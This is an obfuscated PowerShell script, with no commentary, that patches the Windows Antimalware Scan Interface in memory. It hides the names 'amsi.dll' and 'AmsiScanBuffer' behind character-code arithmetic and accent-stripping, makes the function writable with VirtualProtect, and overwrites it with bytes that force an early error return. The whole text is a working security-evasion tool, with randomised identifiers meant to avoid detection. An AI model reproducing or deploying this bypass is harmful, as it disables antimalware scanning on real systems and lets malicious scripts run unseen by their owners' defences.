$Fp1S1dPkOe7ayvvV6Za = @"
using System;
using System.Runtime.InteropServices;
public class Fp1S1dPkOe7ayvvV6Za {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr wzbIq36TXsR08, string zGXlZ1dAi0__egCW7U);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr ya1XygfuN6bJA7gHOz, UIntPtr ZcI63QD2J, uint gZqlPlXlGr4FH, out uint W3b3a2Ra);
}
"@

Add-Type $Fp1S1dPkOe7ayvvV6Za

$rv3YBOiUPGyFrtoW = [Fp1S1dPkOe7ayvvV6Za]::LoadLibrary("$([cHAr](97+70-70)+[CHaR]([bYTe]0x6d)+[CHAr](35+80)+[ChAR](105*70/70)+[CHAR]([ByTe]0x2e)+[Char](100+18-18)+[ChaR](108+37-37)+[chaR](108*42/42))")
$G5lVFJPRqXmDPDf3 = [Fp1S1dPkOe7ayvvV6Za]::GetProcAddress($rv3YBOiUPGyFrtoW, "$(('Ä'+'m'+'s'+'î'+'S'+'c'+'â'+'n'+'B'+'ù'+'f'+'f'+'ê'+'r').normalIZe([cHar]([bYTe]0x46)+[CHAR](111*48/48)+[chAr]([bYtE]0x72)+[cHAr]([bYTe]0x6d)+[cHaR]([BYtE]0x44)) -replace [CHAR](92*79/79)+[cHaR](112+48-48)+[ChAR](123)+[char]([ByTE]0x4d)+[chAR]([byTE]0x6e)+[cHaR]([ByTe]0x7d))")
$p = 0
[Fp1S1dPkOe7ayvvV6Za]::VirtualProtect($G5lVFJPRqXmDPDf3, [uint32]5, 0x40, [ref]$p)
$S9R5leA = "0xB8"
$K0KBc0ZX = "0x57"
$yH73B3wg16U = "0x00"
$NPrP57TRpOn18Im_ssAl = "0x07"
$b0W5gfKjvDu0NfT_ = "0x80"
$hLggwxQ8C2in = "0xC3"
$sJigj46yTc5_JfWo_ = [Byte[]] ($S9R5leA,$K0KBc0ZX,$yH73B3wg16U,$NPrP57TRpOn18Im_ssAl,+$b0W5gfKjvDu0NfT_,+$hLggwxQ8C2in)
[System.Runtime.InteropServices.Marshal]::Copy($sJigj46yTc5_JfWo_, 0, $G5lVFJPRqXmDPDf3, 6)